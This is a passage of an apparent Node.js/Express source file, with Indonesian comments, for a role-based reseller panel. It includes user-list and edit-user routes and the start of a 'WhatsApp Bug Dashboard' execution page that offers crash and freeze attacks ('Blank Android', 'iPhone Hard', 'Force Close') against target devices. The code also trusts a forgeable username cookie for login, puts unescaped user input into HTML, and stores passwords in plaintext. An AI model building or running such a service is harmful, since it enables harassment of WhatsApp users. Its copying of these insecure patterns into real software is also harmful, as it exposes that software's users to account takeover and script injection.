        </td>
        <td>${expired}</td>
        <td>${daysRemaining} hari</td>
        <td>${editButton}</td>
      </tr>
    `;
  }).join("");

  // Tambahkan notifikasi pesan di HTML
  const messageHtml = message ? `
    <div style="
      background: rgba(76, 175, 80, 0.2);
      border: 1px solid #4CAF50;
      color: #4CAF50;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 20px;
      text-align: center;
    ">
      <i class="fas fa-check-circle"></i> ${message}
    </div>
  ` : '';

  const html = `
   <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>User List - DIGITAL CORE</title>
  <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Orbitron:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    * { 
      box-sizing: border-box; 
      margin: 0; 
      padding: 0; 
    }

    body {
      font-family: 'Poppins', sans-serif;
      background: #000000;
      color: #F0F0F0;
      min-height: 100vh;
      padding: 16px;
      position: relative;
      overflow-y: auto;
      overflow-x: hidden;
    }

    #particles {
      position: fixed;
      top: 0; 
      left: 0;
      width: 100%; 
      height: 100%;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 1;
      max-width: 1200px;
      margin: 0 auto;
    }

    .header {
      text-align: center;
      margin-bottom: 30px;
      padding: 20px;
    }

    .header h2 {
      color: #F0F0F0;
      font-size: 28px;
      font-family: 'Orbitron', sans-serif;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin-bottom: 10px;
      text-shadow: 0 0 10px rgba(240, 240, 240, 0.5);
    }

    .header p {
      color: #A0A0A0;
      font-size: 14px;
    }

    .table-container {
      overflow-x: auto;
      border-radius: 12px;
      border: 1px solid #333333;
      background: rgba(26, 26, 26, 0.8);
      backdrop-filter: blur(10px);
      font-size: 14px;
      margin-bottom: 20px;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
    }

    table {
      width: 100%;
      border-collapse: collapse;
      min-width: 600px;
    }
    
    th, td {
      padding: 15px 12px;
      text-align: left;
      border-bottom: 1px solid #333333;
      white-space: nowrap;
    }

    th {
      background: rgba(51, 51, 51, 0.9);
      color: #F0F0F0;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 1px;
      font-size: 12px;
      font-family: 'Orbitron', sans-serif;
    }

    td {
      background: rgba(38, 38, 38, 0.7);
      color: #E0E0E0;
      font-size: 13px;
    }

    tr:hover td {
      background: rgba(60, 60, 60, 0.8);
      transition: background 0.3s ease;
    }

    .role-badge {
      display: inline-block;
      padding: 4px 8px;
      border-radius: 4px;
      font-size: 11px;
      font-weight: bold;
      text-transform: uppercase;
    }

    .role-owner {
      background: linear-gradient(135deg, #FFD700, #FFA500);
      color: #000;
    }

    .role-admin {
      background: linear-gradient(135deg, #FF6B6B, #FF8E8E);
      color: #fff;
    }

    .role-reseller {
      background: linear-gradient(135deg, #4ECDC4, #6BFFE6);
      color: #000;
    }

    .role-user {
      background: linear-gradient(135deg, #95E1D3, #B5EAD7);
      color: #000;
    }

    .btn-edit {
      display: inline-block;
      padding: 6px 12px;
      background: rgba(78, 205, 196, 0.2);
      border: 1px solid rgba(78, 205, 196, 0.5);
      border-radius: 6px;
      color: #4ECDC4;
      text-decoration: none;
      font-size: 12px;
      transition: all 0.3s ease;
    }

    .btn-edit:hover {
      background: rgba(78, 205, 196, 0.3);
      transform: translateY(-2px);
    }

    .close-btn {
      display: block;
      width: 200px;
      padding: 14px;
      margin: 30px auto;
      background: rgba(51, 51, 51, 0.9);
      color: #F0F0F0;
      text-align: center;
      border-radius: 8px;
      text-decoration: none;
      font-size: 14px;
      font-weight: bold;
      font-family: 'Orbitron', sans-serif;
      border: 1px solid #333333;
      cursor: pointer;
      transition: all 0.3s ease;
      box-sizing: border-box;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .close-btn:hover {
      background: rgba(240, 240, 240, 0.1);
      border-color: #F0F0F0;
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(240, 240, 240, 0.2);
    }

    .stats-bar {
      display: flex;
      justify-content: space-between;
      margin-bottom: 20px;
      padding: 15px;
      background: rgba(26, 26, 26, 0.8);
      border: 1px solid #333333;
      border-radius: 8px;
      font-size: 13px;
    }

    .stat-item {
      text-align: center;
      flex: 1;
    }

    .stat-value {
      font-size: 18px;
      font-weight: bold;
      color: #F0F0F0;
      font-family: 'Orbitron', sans-serif;
    }

    .stat-label {
      font-size: 11px;
      color: #A0A0A0;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    @media (max-width: 768px) {
      .header h2 { 
        font-size: 22px; 
      }
      
      table { 
        font-size: 12px; 
      }
      
      th, td { 
        padding: 10px 8px; 
      }
      
      .stats-bar {
        flex-direction: column;
        gap: 10px;
      }
      
      .stat-item {
        text-align: left;
      }
    }

    @media (max-width: 600px) {
      body {
        padding: 10px;
      }
      
      .header {
        padding: 10px;
      }
      
      .header h2 { 
        font-size: 18px; 
      }
    }

    /* Animasi untuk tabel */
    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .table-container {
      animation: fadeIn 0.6s ease-out;
    }

    /* Scrollbar styling */
    .table-container::-webkit-scrollbar {
      height: 8px;
    }

    .table-container::-webkit-scrollbar-track {
      background: rgba(51, 51, 51, 0.5);
      border-radius: 4px;
    }

    .table-container::-webkit-scrollbar-thumb {
      background: rgba(240, 240, 240, 0.3);
      border-radius: 4px;
    }

    .table-container::-webkit-scrollbar-thumb:hover {
      background: rgba(240, 240, 240, 0.5);
    }
  </style>
</head>
<body>
  <div id="particles"></div>

  <div class="content">
    <div class="header">
      <h2><i class="fas fa-users"></i> USER LIST</h2>
      <p>Daftar semua user yang terdaftar dalam sistem</p>
    </div>

    <!-- Notifikasi Pesan -->
    ${messageHtml}

    <!-- Stats Bar -->
    <div class="stats-bar">
      <div class="stat-item">
        <div class="stat-value">${users.length}</div>
        <div class="stat-label">Total Users</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'user').length}</div>
        <div class="stat-label">Regular Users</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'reseller').length}</div>
        <div class="stat-label">Resellers</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'admin').length}</div>
        <div class="stat-label">Admins</div>
      </div>
    </div>

    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th><i class="fas fa-user"></i> Username</th>
            <th><i class="fas fa-shield-alt"></i> Role</th>
            <th><i class="fas fa-calendar-times"></i> Expired</th>
            <th><i class="fas fa-clock"></i> Remaining</th>
            <th><i class="fas fa-cog"></i> Actions</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    </div>

    <a href="/profile" class="close-btn">
      <i class="fas fa-times"></i> TUTUP PROFIL
    </a>
  </div>

  <script>
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: '#333333',
        lineColor: '#555555',
        minSpeedX: 0.1,
        maxSpeedX: 0.3,
        minSpeedY: 0.1,
        maxSpeedY: 0.3,
        density: 8000,
        particleRadius: 2,
        curvedLines: false,
        proximity: 100
      });
    });
  </script>
</body>
</html>
  `;
  res.send(html);
});

app.get("/edituser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const currentUsername = username;
  const targetUsername = req.query.username;

  // Jika tidak ada parameter username, tampilkan form kosong atau redirect
  if (!targetUsername || targetUsername === 'undefined' || targetUsername === 'null') {
    const errorHtml = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Error</title>
      <style>
        body { 
          font-family: Arial, sans-serif; 
          background: #000; 
          color: #fff; 
          text-align: center; 
          padding: 50px; 
        }
        .error { 
          background: #333; 
          padding: 20px; 
          border-radius: 10px; 
          border: 1px solid #4ECDC4;
        }
        .btn {
          display: inline-block;
          padding: 10px 20px;
          background: #4ECDC4;
          color: #000;
          text-decoration: none;
          border-radius: 5px;
          margin-top: 15px;
          font-weight: bold;
        }
      </style>
    </head>
    <body>
      <div class="error">
        <h2>📝 Edit User</h2>
        <p>Silakan pilih user yang ingin diedit dari <a href="/userlist" style="color: #4ECDC4;">User List</a></p>
        <p><small>Parameter username tidak ditemukan</small></p>
        <a href="/userlist" class="btn">
          <i class="fas fa-arrow-left"></i> Kembali ke User List
        </a>
      </div>
    </body>
    </html>
    `;
    return res.send(errorHtml);
  }

  const targetUser = users.find(u => u.username === targetUsername);

  if (!targetUser) {
    const errorHtml = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Error</title>
      <style>
        body { 
          font-family: Arial, sans-serif; 
          background: #000; 
          color: #fff; 
          text-align: center; 
          padding: 50px; 
        }
        .error { 
          background: #333; 
          padding: 20px; 
          border-radius: 10px; 
          border: 1px solid #ff5555;
        }
      </style>
    </head>
    <body>
      <div class="error">
        <h2>❌ ERROR: User tidak ditemukan</h2>
        <p>User dengan username <strong>"${targetUsername}"</strong> tidak ditemukan dalam database.</p>
        <p>Silakan kembali ke <a href="/userlist" style="color: #4ECDC4;">User List</a></p>
      </div>
    </body>
    </html>
    `;
    return res.send(errorHtml);
  }

  // 🔒🔒🔒 PROTEKSI AKSES YANG LEBIH KETAT 🔒🔒🔒
  
  // 1. Tidak bisa edit akun sendiri
  if (targetUsername === currentUsername) {
    return res.send("❌ Tidak bisa edit akun sendiri.");
  }

  // 2. Reseller hanya boleh edit user biasa
  if (role === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh edit user biasa.");
  }

  // 3. Admin tidak boleh edit admin lain ATAU owner
  if (role === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa edit admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa edit owner.");
    }
  }

  // 4. Owner bisa edit semua kecuali diri sendiri (sudah dicek di atas)

  // 🔒 Tentukan opsi role yang boleh diedit
  let roleOptions = "";
  if (role === "owner") {
    roleOptions = `
      <option value="user" ${targetUser.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${targetUser.role === "reseller" ? 'selected' : ''}>Reseller</option>
      <option value="admin" ${targetUser.role === "admin" ? 'selected' : ''}>Admin</option>
      <option value="owner" ${targetUser.role === "owner" ? 'selected' : ''}>Owner</option>
    `;
  } else if (role === "admin") {
    roleOptions = `
      <option value="user" ${targetUser.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${targetUser.role === "reseller" ? 'selected' : ''}>Reseller</option>
    `;
  } else {
    // Reseller tidak bisa edit role
    roleOptions = `<option value="${targetUser.role}" selected>${targetUser.role.charAt(0).toUpperCase() + targetUser.role.slice(1)}</option>`;
  }

  const now = Date.now();
  const sisaHari = Math.max(0, Math.ceil((targetUser.expired - now) / 86400000));
  const expiredText = new Date(targetUser.expired).toLocaleString("id-ID", {
    year: "numeric", month: "2-digit", day: "2-digit",
    hour: "2-digit", minute: "2-digit"
  });

  // HTML form edit user dengan tombol yang sudah dirapihin untuk mobile
  const html = `
  <!DOCTYPE html>
  <html lang="id">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Edit User - DIGITAL CORE</title>
    <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }

      body {
        font-family: 'Poppins', sans-serif;
        background: #000000;
        color: #F0F0F0;
        min-height: 100vh;
        padding: 20px;
        position: relative;
        overflow-y: auto; 
        overflow-x: hidden;
      }

      #particles {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: 0;
      }

      .content {
        position: relative;
        z-index: 2;
        max-width: 500px;
        margin: 0 auto;
      }

      .header {
        text-align: center;
        margin-bottom: 30px;
        padding: 20px;
      }

      .header h2 {
        color: #F0F0F0;
        font-size: 24px;
        font-family: 'Orbitron', sans-serif;
        text-transform: uppercase;
        letter-spacing: 2px;
        margin-bottom: 10px;
        text-shadow: 0 0 10px rgba(240, 240, 240, 0.5);
      }

      .header p {
        color: #A0A0A0;
        font-size: 14px;
      }

      .form-container {
        background: rgba(26, 26, 26, 0.9);
        border: 1px solid #333333;
        padding: 30px;
        border-radius: 12px;
        box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(10px);
        margin-bottom: 20px;
      }

      .user-info {
        background: rgba(51, 51, 51, 0.6);
        padding: 15px;
        border-radius: 8px;
        margin-bottom: 20px;
        border-left: 4px solid #F0F0F0;
      }

      .info-row {
        display: flex;
        justify-content: space-between;
        margin-bottom: 8px;
        font-size: 13px;
      }

      .info-label {
        color: #A0A0A0;
        font-weight: 600;
      }

      .info-value {
        color: #F0F0F0;
        font-weight: 500;
      }

      .role-badge {
        display: inline-block;
        padding: 4px 12px;
        border-radius: 20px;
        font-size: 11px;
        font-weight: bold;
        text-transform: uppercase;
      }

      .role-owner {
        background: linear-gradient(135deg, #FFD700, #FFA500);
        color: #000;
      }

      .role-admin {
        background: linear-gradient(135deg, #FF6B6B, #FF8E8E);
        color: #fff;
      }

      .role-reseller {
        background: linear-gradient(135deg, #4ECDC4, #6BFFE6);
        color: #000;
      }

      .role-user {
        background: linear-gradient(135deg, #95E1D3, #B5EAD7);
        color: #000;
      }

      .form-group {
        margin-bottom: 20px;
      }

      label {
        display: block;
        margin-bottom: 8px;
        font-weight: 600;
        color: #F0F0F0;
        font-family: 'Poppins', sans-serif;
        font-size: 13px;
        text-transform: uppercase;
        letter-spacing: 1px;
      }

      input, select {
        width: 100%;
        padding: 14px;
        border-radius: 8px;
        border: 1px solid #333333;
        background: rgba(38, 38, 38, 0.8);
        color: #F0F0F0;
        box-sizing: border-box;
        font-size: 14px;
        transition: all 0.3s ease;
      }

      input:focus, select:focus {
        outline: none;
        border-color: #F0F0F0;
        box-shadow: 0 0 10px rgba(240, 240, 240, 0.3);
      }

      .expired-info {
        background: rgba(51, 51, 51, 0.6);
        padding: 12px;
        border-radius: 6px;
        font-size: 12px;
        color: #A0A0A0;
        text-align: center;
        margin-top: -10px;
        margin-bottom: 20px;
        border: 1px dashed #333333;
      }

      .warning-text {
        color: #FF6B6B;
        font-weight: bold;
      }

      /* PERBAIKAN UTAMA: BUTTON GROUP YANG LEBIH RESPONSIVE */
      .button-group {
        display: flex;
        flex-direction: column;
        gap: 12px;
        margin-top: 25px;
      }

      .btn {
        width: 100%;
        padding: 16px;
        border: none;
        border-radius: 8px;
        font-weight: bold;
        cursor: pointer;
        transition: all 0.3s ease;
        font-family: 'Orbitron', sans-serif;
        font-size: 14px;
        text-transform: uppercase;
        letter-spacing: 1px;
        text-align: center;
        text-decoration: none;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
      }

      .btn-save {
        background: rgba(240, 240, 240, 0.9);
        color: #000;
        order: 1;
      }

      .btn-save:hover {
        background: #F0F0F0;
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(240, 240, 240, 0.3);
      }

      .btn-delete {
        background: rgba(255, 107, 107, 0.2);
        color: #FF6B6B;
        border: 1px solid #FF6B6B;
        order: 2;
      }

      .btn-delete:hover {
        background: rgba(255, 107, 107, 0.3);
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(255, 107, 107, 0.2);
      }

      .btn-back {
        background: rgba(51, 51, 51, 0.8);
        color: #F0F0F0;
        border: 1px solid #333333;
        order: 3;
        margin-top: 10px;
      }

      .btn-back:hover {
        background: rgba(240, 240, 240, 0.1);
        border-color: #F0F0F0;
        transform: translateY(-2px);
      }

      .permission-note {
        background: rgba(51, 51, 51, 0.6);
        padding: 12px;
        border-radius: 6px;
        font-size: 11px;
        color: #A0A0A0;
        text-align: center;
        margin-top: 15px;
        border-left: 3px solid #4ECDC4;
      }

      /* TAMPILAN DESKTOP */
      @media (min-width: 768px) {
        .button-group {
          flex-direction: row;
          flex-wrap: wrap;
        }
        
        .btn {
          flex: 1;
          min-width: 120px;
        }
        
        .btn-back {
          flex-basis: 100%;
          margin-top: 15px;
        }
      }

      @media (max-width: 500px) {
        body {
          padding: 16px;
        }

        .content {
          max-width: 100%;
        }

        .form-container {
          padding: 20px;
        }

        .button-group {
          gap: 10px;
        }

        .btn {
          padding: 14px 12px;
          font-size: 13px;
        }

        .header h2 {
          font-size: 20px;
        }
        
        .info-row {
          flex-direction: column;
          gap: 2px;
        }
      }

      /* Animasi */
      @keyframes fadeIn {
        from {
          opacity: 0;
          transform: translateY(20px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }

      .form-container {
        animation: fadeIn 0.6s ease-out;
      }
    </style>
  </head>
  <body>
    <!-- Efek Partikel -->
    <div id="particles"></div>

    <div class="content">
      <div class="header">
        <h2><i class="fas fa-edit"></i> EDIT USER</h2>
        <p>Manage user account and permissions</p>
      </div>

      <div class="form-container">
        <!-- User Information -->
        <div class="user-info">
          <div class="info-row">
            <span class="info-label">Current Username:</span>
            <span class="info-value">${targetUser.username}</span>
          </div>
          <div class="info-row">
            <span class="info-label">Current Role:</span>
            <span class="info-value">
              <span class="role-badge role-${targetUser.role}">
                ${targetUser.role.charAt(0).toUpperCase() + targetUser.role.slice(1)}
              </span>
            </span>
          </div>
          <div class="info-row">
            <span class="info-label">Expiration:</span>
            <span class="info-value">${expiredText}</span>
          </div>
          <div class="info-row">
            <span class="info-label">Days Remaining:</span>
            <span class="info-value ${sisaHari <= 7 ? 'warning-text' : ''}">${sisaHari} days</span>
          </div>
        </div>

        <form method="POST" action="/edituser">
          <input type="hidden" name="oldusername" value="${targetUser.username}">
          
          <div class="form-group">
            <label for="username"><i class="fas fa-user"></i> Username</label>
            <input type="text" id="username" name="username" value="${targetUser.username}" required>
          </div>

          <div class="form-group">
            <label for="password"><i class="fas fa-key"></i> Password / Key</label>
            <input type="text" id="password" name="password" value="${targetUser.key}" required>
          </div>

          <div class="form-group">
            <label for="extend"><i class="fas fa-calendar-plus"></i> Extend Duration (Days)</label>
            <input type="number" id="extend" name="extend" min="0" max="365" placeholder="0" value="0">
          </div>

          <div class="form-group">
            <label for="role"><i class="fas fa-shield-alt"></i> Role</label>
            <select id="role" name="role" ${role === 'reseller' ? 'disabled' : ''}>
              ${roleOptions}
            </select>
            ${role === 'reseller' ? '<input type="hidden" name="role" value="' + targetUser.role + '">' : ''}
          </div>

          <!-- PERBAIKAN: TOMBOL DALAM CONTAINER YANG SAMA -->
          <div class="button-group">
            <button type="submit" class="btn btn-save">
              <i class="fas fa-save"></i> SAVE CHANGES
            </button>

            <form method="POST" action="/hapususer" style="display: contents;">
              <input type="hidden" name="username" value="${targetUser.username}">
              <button type="submit" class="btn btn-delete" onclick="return confirm('Are you sure you want to delete user ${targetUser.username}?')">
                <i class="fas fa-trash"></i> DELETE USER
              </button>
            </form>

            <a href="/userlist" class="btn btn-back">
              <i class="fas fa-arrow-left"></i> BACK TO USER LIST
            </a>
          </div>
        </form>
      </div>
    </div>

    <!-- JS Partikel -->
    <script>
      $(document).ready(function() {
        $('#particles').particleground({
          dotColor: '#333333',
          lineColor: '#555555',
          minSpeedX: 0.1,
          maxSpeedX: 0.3,
          minSpeedY: 0.1,
          maxSpeedY: 0.3,
          density: 8000,
          particleRadius: 2,
          curvedLines: false,
          proximity: 100
        });
      });

      // Update role badge when role select changes
      document.getElementById('role')?.addEventListener('change', function() {
        const role = this.value;
        const badge = document.querySelector('.role-badge');
        if (badge) {
          badge.className = \`role-badge role-\${role}\`;
          badge.textContent = role.charAt(0).toUpperCase() + role.slice(1);
        }
      });

      // Add confirmation for delete
      document.querySelector('.btn-delete')?.addEventListener('click', function(e) {
        if (!confirm('Are you sure you want to delete this user? This action cannot be undone.')) {
          e.preventDefault();
        }
      });
    </script>
  </body>
  </html>
  `;
  res.send(html);
});

// Tambahkan ini setelah route GET /edituser
app.post("/edituser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const sessionRole = currentUser.role || 'user';
  const sessionUsername = username;
  const { oldusername, username: newUsername, password, role, extend } = req.body;

  // Validasi input
  if (!oldusername || !newUsername || !password || !role) {
    return res.send("❌ Semua field harus diisi.");
  }

  // Cari user yang akan diedit
  const targetUserIndex = users.findIndex(u => u.username === oldusername);
  if (targetUserIndex === -1) {
    return res.send("❌ User tidak ditemukan.");
  }

  const targetUser = users[targetUserIndex];

  // 🔒🔒🔒 PROTEKSI AKSES YANG LEBIH KETAT 🔒🔒🔒
  
  // 1. Tidak bisa edit akun sendiri
  if (sessionUsername === oldusername) {
    return res.send("❌ Tidak bisa edit akun sendiri.");
  }

  // 2. Reseller hanya boleh edit user biasa
  if (sessionRole === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh edit user biasa.");
  }

  // 3. Admin tidak boleh edit admin lain ATAU owner
  if (sessionRole === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa edit admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa edit owner.");
    }
  }

  // 4. Owner bisa edit semua kecuali diri sendiri (sudah dicek di atas)

  // Update data user
  users[targetUserIndex] = {
    ...users[targetUserIndex],
    username: newUsername,
    key: password,
    role: role
  };

  // Tambah masa aktif jika ada
  if (extend && parseInt(extend) > 0) {
    users[targetUserIndex].expired += parseInt(extend) * 86400000;
  }

  saveUsers(users);
  
  // Redirect ke userlist dengan pesan sukses
  res.redirect("/userlist?msg=User " + newUsername + " berhasil diupdate");
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✓ Server aktif di port ${PORT}`);
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};


// ==================== HTML EXECUTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  // Bug types data - Simplified titles
  const bugTypes = [
    {
      id: 'delay',
      icon: '<i class="fas fa-hourglass-half"></i>',
      title: '50% Delay'
    },
    {
      id: 'medium',
      icon: '<i class="fas fa-tachometer-alt"></i>',
      title: '100% Delay'
    },
    {
      id: 'blank-ios',
      icon: '<i class="fab fa-apple"></i>',
      title: 'iPhone Hard'
    },
    {
      id: 'blank',
      icon: '<i class="fab fa-android"></i>',
      title: 'Blank Android'
    },
    {
      id: 'fcinvsios',
      icon: '<i class="fas fa-eye-slash"></i>',
      title: 'Invisible iOS'
    },
    {
      id: 'force-close',
      icon: '<i class="fas fa-power-off"></i>',
      title: 'Force Close'
    }
  ];

  return `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Bug Dashboard - Execution</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* Variabel Warna Baru: Hitam, Putih, Silver */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary-black: #0a0a0a;
            --carbon-dark: #121212;
            --carbon-medium: #1a1a1a;
            --carbon-light: #2a2a2a;
            --accent-silver: #c0c0c0;
            --accent-white: #ffffff;
            --accent-dark-silver: #606060;
            --text-primary: #ffffff;
            --text-secondary: #c0c0c0;
            --success-color: #4CAF50;
            --error-color: #f44336;
        }

        body {
            font-family: 'Rajdhani', sans-serif;
            background: var(--primary-black);
            color: var(--text-primary);
            overflow-x: hidden;
            position: relative;
            -webkit-font-smoothing: antialiased;
            padding: 0;
        }

        .grid-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: var(--primary-black);
            z-index: -2;
            background-image: 
                radial-gradient(var(--accent-dark-silver) 0.5px, transparent 0.5px),
                radial-gradient(var(--accent-dark-silver) 0.5px, transparent 0.5px);
            background-size: 40px 40px;
            background-position: 0 0, 20px 20px;
            opacity: 0.3;
        }

        .hero {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            padding-top: 50px;
            padding-bottom: 50px;
            text-align: center;
        }

        .hero-content {
            max-width: 800px;
            margin-bottom: 40px;
        }

        .hero-title {
            font-family: 'Orbitron', monospace;
            font-size: 3rem;
            font-weight: 900;
            background: linear-gradient(45deg, var(--accent-white), var(--accent-silver));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-transform: uppercase;
            margin-bottom: 10px;
            letter-spacing: 2px;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
        }

        .hero-subtitle {
            color: var(--text-secondary);
            font-size: 1.2rem;
            margin-bottom: 30px;
            font-weight: 400;
        }

        .target-image-section {
            max-width: 600px;
            margin: 0 auto 30px;
            text-align: center;
        }

        .target-image-container {
            position: relative;
            width: 100%;
            max-width: 500px;
            height: 250px;
            margin: 0 auto 20px;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            border: 2px solid var(--accent-dark-silver);
            transition: all 0.3s ease;
            background: linear-gradient(135deg, #101010, #080808);
        }

        .target-image-container:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.7);
            border-color: var(--accent-silver);
        }

        .target-image {
            width: 100%;
            height: 100%;
            position: relative;
            overflow: hidden;
        }

        .target-image img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0.7;
            position: absolute;
            top: 0;
            left: 0;
            opacity: 0;
            transition: opacity 2s ease-in-out;
        }

        .target-image img.active {
            opacity: 1;
        }

        .target-image-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(to bottom, rgba(0, 0, 0, 0) 0%, rgba(0, 0, 0, 0.9) 85%);
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            align-items: center;
            text-align: center;
            padding: 20px;
            z-index: 2;
        }

        .target-text-container {
            position: relative;
            width: 110%;
            overflow: hidden;
        }

        .target-text {
            font-family: 'Orbitron', monospace;
            font-size: 18px;
            color: var(--accent-silver);
            text-transform: uppercase;
            letter-spacing: 2px;
            white-space: nowrap;
            animation: marquee 15s linear infinite;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
            padding: 5px 0;
        }

        @keyframes marquee {
            0% { transform: translateX(100%); }
            100% { transform: translateX(-100%); }
        }

        .target-description {
            color: var(--text-secondary);
            font-size: 15px;
            max-width: 500px;
            margin: 15px auto 0;
            line-height: 1.6;
        }

        .input-section {
            max-width: 500px;
            margin: 0 auto 30px;
            background: var(--carbon-dark);
            border: 1px solid var(--accent-dark-silver);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-label {
            display: block;
            margin-bottom: 10px;
            color: var(--accent-silver);
            font-weight: 600;
            font-size: 14px;
            text-transform: uppercase;
            font-family: 'Orbitron', monospace;
        }

        .input-field {
            width: 100%;
            padding: 14px 16px;
            border-radius: 12px;
            border: 1px solid var(--accent-dark-silver);
            background: var(--carbon-medium);
            color: var(--text-primary);
            font-size: 15px;
            outline: none;
            transition: 0.3s;
            font-family: 'Rajdhani', sans-serif;
        }

        .input-field:focus {
            border-color: var(--accent-white);
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
            background: var(--carbon-light);
        }

        .menu-toggle-container {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }

        .menu-toggle {
            display: flex;
            flex-direction: column;
            align-items: center;
            cursor: pointer;
            padding: 10px;
            border-radius: 10px;
            background: var(--carbon-medium);
            border: 1px solid var(--accent-dark-silver);
            transition: all 0.3s ease;
            width: 60px;
        }

        .menu-toggle:hover {
            background: var(--carbon-light);
            border-color: var(--accent-white);
        }

        .menu-toggle span {
            width: 25px;
            height: 3px;
            background: var(--accent-silver);
            margin: 2px 0;
            transition: 0.3s;
